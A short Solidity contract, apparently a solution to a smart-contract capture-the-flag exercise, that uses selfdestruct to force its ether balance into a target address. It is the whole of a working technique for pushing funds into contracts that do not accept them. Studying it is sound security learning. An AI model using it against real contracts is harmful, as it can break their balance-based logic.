// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHacker {
  function kill(address payable force) external payable {
    selfdestruct(force);
  }
}